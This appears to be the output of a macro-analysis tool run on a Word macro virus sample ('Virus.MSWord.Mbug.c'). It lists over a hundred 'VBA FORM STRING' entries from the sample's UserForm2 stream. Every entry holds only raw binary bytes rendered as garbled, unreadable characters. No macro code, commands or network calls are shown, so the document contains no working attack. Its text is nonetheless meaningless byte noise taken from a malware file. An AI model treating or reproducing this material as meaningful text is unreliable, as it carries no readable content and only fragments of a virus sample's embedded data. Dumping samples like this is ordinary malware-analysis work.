VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙X0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2B���$B�*R�0�ѤK�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�����K�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`l���獍7/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�gˠ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iD�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jT�3f4�Z�jϬ6lL�
Ӧիac�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���٨3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%;�מbk�u
@�]�q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 @ �0]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ld]|w����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
 F��wm��L8���j���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�a�5�j,���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L��ܺ�䒕g����4_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wk$:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����Ɲ�k��L���3a�[���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�����_-<�����w�?}<��ӈ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������_*����ﱧ_t���Rb�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W?g�I��םm==
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�eX�0Y��~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(��3�hb���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
؋0*6bQ`�H�e6.�#X��#��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��dh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5|`[�R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pB`
�Vy7��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���+�$C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I��b�%&����b�uaY
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�{��ԏ7,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"z��R�����MZ��J��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N8j�d��~�(j��f��[��U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?}J��0U���B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$La�f+����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ӌ0�Y���b7T�x&������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���)�eHf
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XkA�+Q�"V&X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Go��T��v���*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k_1�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)W�ʖ��ZU\��O�
፱�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)V�2|kk�����8&,2�|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�Ā}eC	ю�1�1c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WE2L7���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ܐ�}]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mr\!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kkؖ�Q&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V	jT��OOH�֑Z<5]��&��~*x�x���#��ݥ�q�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CH��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��!!~`�r���Ҏ�)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��CH��2��5՘������Ws@B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����9N6�p���Ɛ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�p��8��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	: �3�u�=
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�a���I���}�;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ItU|g5Um
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ր��_?�~����g�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?m�������(���@ �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7Uٟ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'x��էz
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�VU�+y�MN	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
333fff�������������fff33̙��33�ff�333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙�P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
